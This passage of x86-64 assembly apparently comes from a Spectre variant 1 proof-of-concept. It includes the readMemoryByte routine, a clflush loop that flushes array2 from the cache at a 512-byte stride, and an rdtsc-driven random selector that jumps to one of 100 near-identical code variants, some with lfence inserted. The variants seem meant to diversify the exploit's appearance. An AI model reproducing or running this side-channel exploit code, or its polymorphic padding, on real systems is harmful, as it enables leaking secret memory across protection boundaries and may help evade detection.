	movl	$1999, -100(%rbp)
	jmp	.LreadMemoryByte_win11_continue
## Variant 65
.LreadMemoryByte_win11_var65:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L6
	lfence
	movl	$1999, -100(%rbp)
	jmp	.LreadMemoryByte_win11_continue
## Variant 66
.LreadMemoryByte_win11_var66:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L6
	lfence
	movl	$1999, -100(%rbp)
	jmp	.LreadMemoryByte_win11_continue
## Variant 67
.LreadMemoryByte_win11_var67:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L6
	lfence
	movl	$1999, -100(%rbp)
	jmp	.LreadMemoryByte_win11_continue
## Variant 68
.LreadMemoryByte_win11_var68:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L6
	lfence
	movl	$1999, -100(%rbp)
	jmp	.LreadMemoryByte_win11_continue
## Variant 69
.LreadMemoryByte_win11_var69:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L6
	lfence
	movl	$1999, -100(%rbp)
	jmp	.LreadMemoryByte_win11_continue
## Variant 70
.LreadMemoryByte_win11_var70:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L6
	lfence
	movl	$1999, -100(%rbp)
	jmp	.LreadMemoryByte_win11_continue
## Variant 71
.LreadMemoryByte_win11_var71:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L6
	lfence
	movl	$1999, -100(%rbp)
	jmp	.LreadMemoryByte_win11_continue
## Variant 72
.LreadMemoryByte_win11_var72:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L6
	lfence
	movl	$1999, -100(%rbp)
	jmp	.LreadMemoryByte_win11_continue
## Variant 73
.LreadMemoryByte_win11_var73:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L6
	lfence
	movl	$1999, -100(%rbp)
	jmp	.LreadMemoryByte_win11_continue
## Variant 74
.LreadMemoryByte_win11_var74:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L6
	lfence
	movl	$1999, -100(%rbp)
	jmp	.LreadMemoryByte_win11_continue
## Variant 75
.LreadMemoryByte_win11_var75:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L6
	lfence
	movl	$1999, -100(%rbp)
	jmp	.LreadMemoryByte_win11_continue
## Variant 76
.LreadMemoryByte_win11_var76:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L6
	lfence
	movl	$1999, -100(%rbp)
	jmp	.LreadMemoryByte_win11_continue
## Variant 77
.LreadMemoryByte_win11_var77:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L6
	lfence
	movl	$1999, -100(%rbp)
	jmp	.LreadMemoryByte_win11_continue
## Variant 78
.LreadMemoryByte_win11_var78:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L6
	lfence
	movl	$1999, -100(%rbp)
	jmp	.LreadMemoryByte_win11_continue
## Variant 79
.LreadMemoryByte_win11_var79:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L6
	lfence
	movl	$1999, -100(%rbp)
	jmp	.LreadMemoryByte_win11_continue
## Variant 80
.LreadMemoryByte_win11_var80:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L6
	lfence
	movl	$1999, -100(%rbp)
	jmp	.LreadMemoryByte_win11_continue
## Variant 81
.LreadMemoryByte_win11_var81:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L6
	lfence
	movl	$1999, -100(%rbp)
	jmp	.LreadMemoryByte_win11_continue
## Variant 82
.LreadMemoryByte_win11_var82:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L6
	lfence
	movl	$1999, -100(%rbp)
	jmp	.LreadMemoryByte_win11_continue
## Variant 83
.LreadMemoryByte_win11_var83:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L6
	lfence
	movl	$1999, -100(%rbp)
	jmp	.LreadMemoryByte_win11_continue
## Variant 84
.LreadMemoryByte_win11_var84:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L6
	lfence
	movl	$1999, -100(%rbp)
	jmp	.LreadMemoryByte_win11_continue
## Variant 85
.LreadMemoryByte_win11_var85:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L6
	lfence
	movl	$1999, -100(%rbp)
	jmp	.LreadMemoryByte_win11_continue
## Variant 86
.LreadMemoryByte_win11_var86:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L6
	lfence
	movl	$1999, -100(%rbp)
	jmp	.LreadMemoryByte_win11_continue
## Variant 87
.LreadMemoryByte_win11_var87:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L6
	lfence
	movl	$1999, -100(%rbp)
	jmp	.LreadMemoryByte_win11_continue
## Variant 88
.LreadMemoryByte_win11_var88:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L6
	lfence
	movl	$1999, -100(%rbp)
	jmp	.LreadMemoryByte_win11_continue
## Variant 89
.LreadMemoryByte_win11_var89:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L6
	lfence
	movl	$1999, -100(%rbp)
	jmp	.LreadMemoryByte_win11_continue
## Variant 90
.LreadMemoryByte_win11_var90:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L6
	lfence
	movl	$1999, -100(%rbp)
	jmp	.LreadMemoryByte_win11_continue
## Variant 91
.LreadMemoryByte_win11_var91:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L6
	lfence
	movl	$1999, -100(%rbp)
	jmp	.LreadMemoryByte_win11_continue
## Variant 92
.LreadMemoryByte_win11_var92:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L6
	lfence
	movl	$1999, -100(%rbp)
	jmp	.LreadMemoryByte_win11_continue
## Variant 93
.LreadMemoryByte_win11_var93:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L6
	lfence
	movl	$1999, -100(%rbp)
	jmp	.LreadMemoryByte_win11_continue
## Variant 94
.LreadMemoryByte_win11_var94:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L6
	lfence
	movl	$1999, -100(%rbp)
	jmp	.LreadMemoryByte_win11_continue
## Variant 95
.LreadMemoryByte_win11_var95:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L6
	lfence
	movl	$1999, -100(%rbp)
	jmp	.LreadMemoryByte_win11_continue
## Variant 96
.LreadMemoryByte_win11_var96:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L6
	lfence
	movl	$1999, -100(%rbp)
	jmp	.LreadMemoryByte_win11_continue
## Variant 97
.LreadMemoryByte_win11_var97:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L6
	lfence
	movl	$1999, -100(%rbp)
	jmp	.LreadMemoryByte_win11_continue
## Variant 98
.LreadMemoryByte_win11_var98:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L6
	lfence
	movl	$1999, -100(%rbp)
	jmp	.LreadMemoryByte_win11_continue
## Variant 99
.LreadMemoryByte_win11_var99:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L6
	lfence
	movl	$1999, -100(%rbp)
	jmp	.LreadMemoryByte_win11_continue
.LreadMemoryByte_win11_continue:
	addq	$32, %rsp
	jmp	.L7
.L27:
	movl	$0, -96(%rbp)
	jmp	.L8
.L9:
	movl	-96(%rbp), %eax
	sall	$9, %eax
	cltq
	leaq	array2(%rip), %rdx
	addq	%rdx, %rax
	movq	%rax, -56(%rbp)
	movq	-56(%rbp), %rax
	clflush	(%rax)
	nop
	addl	$1, -96(%rbp)
.L8:
	subq	$32, %rsp
## RANDOM SELECTOR BLOCK
	pushq	%rax
	pushq	%rcx
	pushq	%rdx
	rdtsc
	xorq	%rdx, %rax
	movl	$100, %ecx
	xorl	%edx, %edx
	divl	%ecx
	movl	%edx, %eax
	popq	%rdx
	popq	%rcx
	cmpl	$0, %eax
	je	.LreadMemoryByte_win10_var0
	cmpl	$1, %eax
	je	.LreadMemoryByte_win10_var1
	cmpl	$2, %eax
	je	.LreadMemoryByte_win10_var2
	cmpl	$3, %eax
	je	.LreadMemoryByte_win10_var3
	cmpl	$4, %eax
	je	.LreadMemoryByte_win10_var4
	cmpl	$5, %eax
	je	.LreadMemoryByte_win10_var5
	cmpl	$6, %eax
	je	.LreadMemoryByte_win10_var6
	cmpl	$7, %eax
	je	.LreadMemoryByte_win10_var7
	cmpl	$8, %eax
	je	.LreadMemoryByte_win10_var8
	cmpl	$9, %eax
	je	.LreadMemoryByte_win10_var9
	cmpl	$10, %eax
	je	.LreadMemoryByte_win10_var10
	cmpl	$11, %eax
	je	.LreadMemoryByte_win10_var11
	cmpl	$12, %eax
	je	.LreadMemoryByte_win10_var12
	cmpl	$13, %eax
	je	.LreadMemoryByte_win10_var13
	cmpl	$14, %eax
	je	.LreadMemoryByte_win10_var14
	cmpl	$15, %eax
	je	.LreadMemoryByte_win10_var15
	cmpl	$16, %eax
	je	.LreadMemoryByte_win10_var16
	cmpl	$17, %eax
	je	.LreadMemoryByte_win10_var17
	cmpl	$18, %eax
	je	.LreadMemoryByte_win10_var18
	cmpl	$19, %eax
	je	.LreadMemoryByte_win10_var19
	cmpl	$20, %eax
	je	.LreadMemoryByte_win10_var20
	cmpl	$21, %eax
	je	.LreadMemoryByte_win10_var21
	cmpl	$22, %eax
	je	.LreadMemoryByte_win10_var22
	cmpl	$23, %eax
	je	.LreadMemoryByte_win10_var23
	cmpl	$24, %eax
	je	.LreadMemoryByte_win10_var24
	cmpl	$25, %eax
	je	.LreadMemoryByte_win10_var25
	cmpl	$26, %eax
	je	.LreadMemoryByte_win10_var26
	cmpl	$27, %eax
	je	.LreadMemoryByte_win10_var27
	cmpl	$28, %eax
	je	.LreadMemoryByte_win10_var28
	cmpl	$29, %eax
	je	.LreadMemoryByte_win10_var29
	cmpl	$30, %eax
	je	.LreadMemoryByte_win10_var30
	cmpl	$31, %eax
	je	.LreadMemoryByte_win10_var31
	cmpl	$32, %eax
	je	.LreadMemoryByte_win10_var32
	cmpl	$33, %eax
	je	.LreadMemoryByte_win10_var33
	cmpl	$34, %eax
	je	.LreadMemoryByte_win10_var34
	cmpl	$35, %eax
	je	.LreadMemoryByte_win10_var35
	cmpl	$36, %eax
	je	.LreadMemoryByte_win10_var36
	cmpl	$37, %eax
	je	.LreadMemoryByte_win10_var37
	cmpl	$38, %eax
	je	.LreadMemoryByte_win10_var38
	cmpl	$39, %eax
	je	.LreadMemoryByte_win10_var39
	cmpl	$40, %eax
	je	.LreadMemoryByte_win10_var40
	cmpl	$41, %eax
	je	.LreadMemoryByte_win10_var41
	cmpl	$42, %eax
	je	.LreadMemoryByte_win10_var42
	cmpl	$43, %eax
	je	.LreadMemoryByte_win10_var43
	cmpl	$44, %eax
	je	.LreadMemoryByte_win10_var44
	cmpl	$45, %eax
	je	.LreadMemoryByte_win10_var45
	cmpl	$46, %eax
	je	.LreadMemoryByte_win10_var46
	cmpl	$47, %eax
	je	.LreadMemoryByte_win10_var47
	cmpl	$48, %eax
	je	.LreadMemoryByte_win10_var48
	cmpl	$49, %eax
	je	.LreadMemoryByte_win10_var49
	cmpl	$50, %eax
	je	.LreadMemoryByte_win10_var50
	cmpl	$51, %eax
	je	.LreadMemoryByte_win10_var51
	cmpl	$52, %eax
	je	.LreadMemoryByte_win10_var52
	cmpl	$53, %eax
	je	.LreadMemoryByte_win10_var53
	cmpl	$54, %eax
	je	.LreadMemoryByte_win10_var54
	cmpl	$55, %eax
	je	.LreadMemoryByte_win10_var55
	cmpl	$56, %eax
	je	.LreadMemoryByte_win10_var56
	cmpl	$57, %eax
	je	.LreadMemoryByte_win10_var57
	cmpl	$58, %eax
	je	.LreadMemoryByte_win10_var58
	cmpl	$59, %eax
	je	.LreadMemoryByte_win10_var59
	cmpl	$60, %eax
	je	.LreadMemoryByte_win10_var60
	cmpl	$61, %eax
	je	.LreadMemoryByte_win10_var61
	cmpl	$62, %eax
	je	.LreadMemoryByte_win10_var62
	cmpl	$63, %eax
	je	.LreadMemoryByte_win10_var63
	cmpl	$64, %eax
	je	.LreadMemoryByte_win10_var64
	cmpl	$65, %eax
	je	.LreadMemoryByte_win10_var65
	cmpl	$66, %eax
	je	.LreadMemoryByte_win10_var66
	cmpl	$67, %eax
	je	.LreadMemoryByte_win10_var67
	cmpl	$68, %eax
	je	.LreadMemoryByte_win10_var68
	cmpl	$69, %eax
	je	.LreadMemoryByte_win10_var69
	cmpl	$70, %eax
	je	.LreadMemoryByte_win10_var70
	cmpl	$71, %eax
	je	.LreadMemoryByte_win10_var71
	cmpl	$72, %eax
	je	.LreadMemoryByte_win10_var72
	cmpl	$73, %eax
	je	.LreadMemoryByte_win10_var73
	cmpl	$74, %eax
	je	.LreadMemoryByte_win10_var74
	cmpl	$75, %eax
	je	.LreadMemoryByte_win10_var75
	cmpl	$76, %eax
	je	.LreadMemoryByte_win10_var76
	cmpl	$77, %eax
	je	.LreadMemoryByte_win10_var77
	cmpl	$78, %eax
	je	.LreadMemoryByte_win10_var78
	cmpl	$79, %eax
	je	.LreadMemoryByte_win10_var79
	cmpl	$80, %eax
	je	.LreadMemoryByte_win10_var80
	cmpl	$81, %eax
	je	.LreadMemoryByte_win10_var81
	cmpl	$82, %eax
	je	.LreadMemoryByte_win10_var82
	cmpl	$83, %eax
	je	.LreadMemoryByte_win10_var83
	cmpl	$84, %eax
	je	.LreadMemoryByte_win10_var84
	cmpl	$85, %eax
	je	.LreadMemoryByte_win10_var85
	cmpl	$86, %eax
	je	.LreadMemoryByte_win10_var86
	cmpl	$87, %eax
	je	.LreadMemoryByte_win10_var87
	cmpl	$88, %eax
	je	.LreadMemoryByte_win10_var88
	cmpl	$89, %eax
	je	.LreadMemoryByte_win10_var89
	cmpl	$90, %eax
	je	.LreadMemoryByte_win10_var90
	cmpl	$91, %eax
	je	.LreadMemoryByte_win10_var91
	cmpl	$92, %eax
	je	.LreadMemoryByte_win10_var92
	cmpl	$93, %eax
	je	.LreadMemoryByte_win10_var93
	cmpl	$94, %eax
	je	.LreadMemoryByte_win10_var94
	cmpl	$95, %eax
	je	.LreadMemoryByte_win10_var95
	cmpl	$96, %eax
	je	.LreadMemoryByte_win10_var96
	cmpl	$97, %eax
	je	.LreadMemoryByte_win10_var97
	cmpl	$98, %eax
	je	.LreadMemoryByte_win10_var98
	cmpl	$99, %eax
	je	.LreadMemoryByte_win10_var99
	jmp	.LreadMemoryByte_win10_var0
## Variant 0
.LreadMemoryByte_win10_var0:
	popq	%rax
	cmpl	$255, -96(%rbp)
	jle	.L9
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win10_continue
## Variant 1
.LreadMemoryByte_win10_var1:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L9
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win10_continue
## Variant 2
.LreadMemoryByte_win10_var2:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L9
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win10_continue
## Variant 3
.LreadMemoryByte_win10_var3:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L9
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win10_continue
## Variant 4
.LreadMemoryByte_win10_var4:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L9
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win10_continue
## Variant 5
.LreadMemoryByte_win10_var5:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L9
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win10_continue
## Variant 6
.LreadMemoryByte_win10_var6:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L9
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win10_continue
## Variant 7
.LreadMemoryByte_win10_var7:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L9
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win10_continue
## Variant 8
.LreadMemoryByte_win10_var8:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L9
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win10_continue
## Variant 9
.LreadMemoryByte_win10_var9:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L9
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win10_continue
## Variant 10
.LreadMemoryByte_win10_var10:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L9
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win10_continue
## Variant 11
.LreadMemoryByte_win10_var11:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L9
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win10_continue
## Variant 12
.LreadMemoryByte_win10_var12:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L9
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win10_continue
## Variant 13
.LreadMemoryByte_win10_var13:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L9
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win10_continue
## Variant 14
.LreadMemoryByte_win10_var14:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L9
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win10_continue
## Variant 15
.LreadMemoryByte_win10_var15:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L9
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win10_continue
## Variant 16
.LreadMemoryByte_win10_var16:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L9
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win10_continue
## Variant 17
.LreadMemoryByte_win10_var17:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L9
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win10_continue
## Variant 18
.LreadMemoryByte_win10_var18:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L9
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win10_continue
## Variant 19
.LreadMemoryByte_win10_var19:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L9
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win10_continue
## Variant 20
.LreadMemoryByte_win10_var20:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L9
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win10_continue
## Variant 21
.LreadMemoryByte_win10_var21:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L9
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win10_continue
## Variant 22
.LreadMemoryByte_win10_var22:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L9
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win10_continue
## Variant 23
.LreadMemoryByte_win10_var23:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L9
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win10_continue
## Variant 24
.LreadMemoryByte_win10_var24:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L9
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win10_continue
## Variant 25
.LreadMemoryByte_win10_var25:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L9
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win10_continue
## Variant 26
.LreadMemoryByte_win10_var26:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L9
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win10_continue
## Variant 27
.LreadMemoryByte_win10_var27:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L9
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win10_continue
## Variant 28
.LreadMemoryByte_win10_var28:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L9
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win10_continue
## Variant 29
.LreadMemoryByte_win10_var29:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L9
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win10_continue
## Variant 30
.LreadMemoryByte_win10_var30:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L9
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win10_continue
## Variant 31
.LreadMemoryByte_win10_var31:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L9
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win10_continue
## Variant 32
.LreadMemoryByte_win10_var32:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L9
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win10_continue
## Variant 33
.LreadMemoryByte_win10_var33:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L9
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win10_continue
## Variant 34
.LreadMemoryByte_win10_var34:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L9
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win10_continue
## Variant 35
.LreadMemoryByte_win10_var35:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L9
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win10_continue
## Variant 36
.LreadMemoryByte_win10_var36:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L9
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win10_continue
## Variant 37
.LreadMemoryByte_win10_var37:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L9
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win10_continue
## Variant 38
.LreadMemoryByte_win10_var38:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L9
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win10_continue
## Variant 39
.LreadMemoryByte_win10_var39:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L9
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win10_continue
## Variant 40
.LreadMemoryByte_win10_var40:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L9
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win10_continue
## Variant 41
.LreadMemoryByte_win10_var41:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L9
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win10_continue
## Variant 42
.LreadMemoryByte_win10_var42:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L9
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win10_continue
## Variant 43
.LreadMemoryByte_win10_var43:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L9
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win10_continue
## Variant 44
.LreadMemoryByte_win10_var44:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L9
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win10_continue
## Variant 45
.LreadMemoryByte_win10_var45:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L9
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win10_continue
## Variant 46
.LreadMemoryByte_win10_var46:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L9
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win10_continue
## Variant 47
.LreadMemoryByte_win10_var47:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L9
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win10_continue
## Variant 48
.LreadMemoryByte_win10_var48:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L9
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win10_continue
## Variant 49
.LreadMemoryByte_win10_var49:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L9
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win10_continue
## Variant 50
.LreadMemoryByte_win10_var50:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L9
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win10_continue
## Variant 51
.LreadMemoryByte_win10_var51:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L9
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win10_continue
## Variant 52
.LreadMemoryByte_win10_var52:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L9
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win10_continue
## Variant 53
.LreadMemoryByte_win10_var53:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L9
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win10_continue
## Variant 54
.LreadMemoryByte_win10_var54:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L9
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win10_continue
## Variant 55
.LreadMemoryByte_win10_var55:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L9
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win10_continue
## Variant 56
.LreadMemoryByte_win10_var56:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L9
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win10_continue
## Variant 57
.LreadMemoryByte_win10_var57:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L9
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win10_continue
## Variant 58
.LreadMemoryByte_win10_var58:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L9
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win10_continue
## Variant 59
.LreadMemoryByte_win10_var59:
	popq	%rax
	lfence
	cmpl	$255, -96(%rbp)
	jle	.L9
	lfence
	movl	-100(%rbp), %eax
	movl	array1_size(%rip), %ecx
	jmp	.LreadMemoryByte_win10_continue
## Variant 60
